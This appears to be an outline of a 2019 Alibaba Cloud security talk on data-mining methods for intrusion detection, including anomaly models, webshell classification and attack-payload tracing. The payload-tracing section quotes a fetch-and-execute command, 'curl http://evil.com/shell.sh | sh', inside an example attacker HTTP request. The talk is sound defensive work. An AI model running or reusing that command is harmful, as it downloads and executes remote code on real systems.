### 数据挖掘赋能安全感知：阿里云大数据入侵检测实践

#### 作者
- **Han Zheng** - 资深安全工程师
- **Yue Xu** - 安全工程师
- **Wei He** - 团队成员

#### 日期
2019年5月29日

#### 团队介绍
任职于阿里巴巴云安全中心，负责算法实现和入侵检测与威胁情报的研发。

### 云 + 安全性的优势
- **数据计算能力**
- **丰富的安全日志**
- **全局视角的数据分析**

### 挑战
- **庞大的业务环境**
- **从“脚本小子”到国家层面的多方威胁**
- **精确率和召回率难以兼顾**

### 数据流与威胁建模
#### 威胁建模案例
- **暴力攻击**
- **恶意行为链**
- **恶意 Web 脚本（即 Webshell）**
- **攻击载荷回溯**

### 基于规则的决策问题
- **服务器登录事件的特征**
  - 难以在假正率（False Positive）和真负率（True Negative）之间取得平衡。
  - 不同服务器的行为各异，无法全面覆盖所有情况。

### 多元高斯模型
- **查找异常行为**
  - 使用高斯分布来识别异常行为。

### 模式挖掘
- **流程、文件和网络的链接**
  - 生成强关联规则
  - DDG 挖掘命令
  - 匹配到的模式

### 恶意 Web 脚本
- **两类恶意 PHP 脚本（Webshell）**
  - 特征
    - 文本特征
    - 动态函数调用
    - opcode

### 机器学习性能
- **每日遭感染主机数（2 - 4 月）**
- **实验室性能**
  - 针对 30,000 个样本进行测试
  - 实现了 F1=98.78%, AUC=99.97%
- **上线后性能**
  - 检测率提高 17%，3 个月内仅一次假阳性警报

### 自动化攻击回溯
- **发现恶意进程**
  - `curl http://evil.com/shell.sh | sh`
- **如何被入侵的？**
  - 攻击者的 HTTP 请求
    ```
    POST /XXX/XXXX HTTP/1.1
    Host: xxx.xx.xxx:7001
    cmd=curl http://evil.com/shell.sh | sh&XXXXXXXXXX
    ```

### 文本相似性分析
- **问题**
  - 如果攻击者的载荷被编码/加密？
- **编码后载荷回溯**
  - 解决了在不具备文本特征且对弱点不了解的情况下进行载荷回溯的能力
  - 仅适用于一对多攻击

### 编码后载荷回溯案例
- **发现 Webshell 连接流**
  - 载荷使用 base64 编码
- **发现 Java 反序列化利用**
  - 载荷通过 Java 序列化编码
- **发现 SQL 注入导致的 RCE**
  - RCE 载荷隐藏在一个特殊的六进制字符串中

### 借助数据挖掘增强安全感知能力
- **标签数据的缺乏和不明确的威胁边界限制了机器学习在安全领域的表现。**
- **面对网络威胁，AI 并非“万灵药”。更重要的是确定何时需要 AI 以及如何量化效果。**
- **没有免费的午餐，必须根据具体项目的实际情况选择最适合的算法。**

### 优势和挑战
- **威胁建模案例**
  - 暴力攻击
  - 异常进程启动
  - 恶意 Web 脚本（即 Webshell）
  - 攻击载荷回溯

### 问答环节
- **Enhance Security Awareness with Data Mining**
- **联系信息**
  - Han Zheng: [EMAIL]
  - Yue Xu: [EMAIL]
  - 郑瀚 (Andrew_Hann): cdxy000, cdxy_